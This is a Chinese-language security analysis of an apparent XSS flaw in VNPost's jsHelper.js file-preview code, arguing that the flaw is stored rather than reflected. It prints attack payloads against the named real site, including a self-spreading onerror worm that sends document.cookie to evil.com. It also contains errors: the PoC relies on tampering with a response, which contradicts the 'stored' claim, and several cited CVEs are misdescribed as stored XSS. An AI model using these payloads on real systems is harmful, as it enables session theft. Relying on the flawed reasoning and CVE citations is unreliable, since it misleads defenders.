# VNPost XSS 类型分析

## 🔍 漏洞代码回顾

```javascript
// jsHelper.js line 62-66
this.previewUpload = (data, type = 'image', height = '100px', icon = '') => {
    if (type == 'image') 
        preview.innerHTML = data.map(item => 
            `<image src="${item.filepath}" alt="${item.filename}">`
        ).join('')
        
    if (type == 'file') 
        preview.innerHTML = data.map(item => 
            `<a href="${item.filepath}">${icon} ${item.filename}</a><br>`
        ).join('')
}
```

## 📊 XSS类型判断

### 数据流分析

```
用户上传文件
    ↓
POST /rest/media/upload-file
    ↓
服务器处理并存储
    ↓
返回: {filename: "evil.jpg", filepath: "/uploads/evil.jpg"}
    ↓
【存储到数据库】 ← 关键！
    ↓
后续页面访问
    ↓
从数据库读取文件列表
    ↓
调用 previewUpload(data, 'file')
    ↓
innerHTML 插入 → XSS触发！
```

### 判断依据

| 特征 | 反射型XSS | 存储型XSS | 本漏洞 |
|------|-----------|-----------|--------|
| 数据存储 | ❌ 不存储 | ✅ 存储到服务器 | ✅ **存储** |
| 触发时机 | 立即（当次请求） | 延迟（后续访问） | ✅ **延迟** |
| 影响范围 | 单个用户 | 所有访问者 | ✅ **所有人** |
| 持久性 | 一次性 | 持久化 | ✅ **持久** |
| 严重程度 | Medium | High | ✅ **High** |

## ✅ **结论：存储型XSS (Stored XSS)**

### 证据

1. **数据持久化**:
```javascript
// 上传后，filename被存储到数据库
POST /rest/media/upload-file
Response: {filename: "payload.jpg", filepath: "/uploads/xxx"}
// ↑ 这个数据会被保存
```

2. **多次触发**:
```javascript
// 每次有人访问文件列表页面时，都会从数据库读取
// 然后调用 previewUpload() → 每次都触发XSS
```

3. **影响所有用户**:
- 管理员上传恶意文件名
- 所有访问该页面的用户都被攻击
- 不需要特定的URL参数

### 与反射型XSS的区别

#### 反射型XSS (我们**没有**的)
```javascript
// 场景：URL参数直接反射
https://vnpost.vn/search?q=<script>alert(1)</script>

// 代码：
document.write(getUrlParam('q'))  // 立即反射
```

#### 存储型XSS (我们**发现的**)
```javascript
// 场景：数据库存储
1. 上传: filename = '<img src=x onerror=alert(1)>'
2. 存储到数据库
3. 任何人访问文件列表 → 触发XSS
```

## 🔥 **为什么存储型更严重？**

### 1. **蠕虫传播**
```javascript
// 恶意payload可以自我复制
<img src=x onerror="
    // 窃取当前用户Cookie
    fetch('https://evil.com/steal?c='+document.cookie);
    
    // 以当前用户身份再上传恶意文件
    fetch('/rest/media/upload-file', {
        body: maliciousFile,
        headers: {'X-CSRF-Token': getToken()}
    });
">
```

### 2. **持续攻击**
```
- 反射型: 需要诱导用户点击恶意链接（一次性）
- 存储型: 一次注入，永久有效（持续攻击）
```

### 3. **影响范围**
```
- 反射型: 只影响点击链接的用户
- 存储型: 影响所有访问该页面的用户
  - 管理员
  - 普通用户
  - 访客
```

## 📈 CVSS评分

### 反射型XSS: 6.1 (Medium)
```
AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
需要用户交互（点击链接）
```

### 存储型XSS: 8.8 (High) ⬆️
```
AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N
不需要用户交互，持久化攻击
```

## 🎯 利用场景对比

### 反射型XSS利用
```
1. 构造恶意URL
2. 发送钓鱼邮件
3. 诱导用户点击
4. 单次攻击
```

### 存储型XSS利用（更强）
```
1. 上传一次恶意payload
2. 等待管理员查看
3. 自动触发，无需交互
4. 持续攻击所有访问者
5. 可以自我传播（XSS蠕虫）
```

## 🔬 PoC 证明（存储型）

```javascript
// Step 1: 上传恶意文件
const evilFile = new File(["dummy"], "test.jpg");
const formData = new FormData();
formData.append('files[]', evilFile);

// 拦截响应并修改
// Response (被篡改):
{
    "filename": "<img src=x onerror='alert(document.domain)'>",
    "filepath": "/uploads/test.jpg"
}

// Step 2: 该数据被存储到数据库

// Step 3: 任何用户访问文件列表页面
// → 从数据库读取
// → previewUpload() 被调用
// → innerHTML 插入恶意代码
// → XSS 自动触发！（无需用户点击任何东西）
```

## 💡 修复建议（针对存储型XSS）

### 1. 输入验证（上传时）
```javascript
function sanitizeFilename(filename) {
    // 移除HTML标签
    return filename.replace(/<[^>]*>/g, '');
}
```

### 2. 输出编码（显示时）
```javascript
// 使用 textContent 而不是 innerHTML
const link = document.createElement('a');
link.textContent = item.filename;  // 自动HTML编码
preview.appendChild(link);
```

### 3. CSP (Content Security Policy)
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

### 4. HTTPOnly Cookie
```
Set-Cookie: JSESSIONID=xxx; HttpOnly; Secure; SameSite=Strict
```

## 🎯 总结

| 特性 | 判断 |
|------|------|
| **XSS类型** | ✅ **存储型 (Stored)** |
| **不是反射型** | ❌ |
| **严重程度** | 🔴 **High (8.8)** |
| **持久化** | ✅ 是 |
| **需要用户交互** | ❌ 否（更危险） |
| **影响所有访问者** | ✅ 是 |
| **可以写蠕虫** | ✅ 是 |

---

**结论**: 这是**存储型XSS**，比反射型更严重，因为它：
1. 持久化存储
2. 自动触发（无需点击）
3. 影响所有用户
4. 可以自我传播

**CVE类似案例**: 
- CVE-2019-11358 (jQuery XSS)
- CVE-2020-5902 (F5 BIG-IP Stored XSS)
- CVE-2021-21315 (System Information Stored XSS)
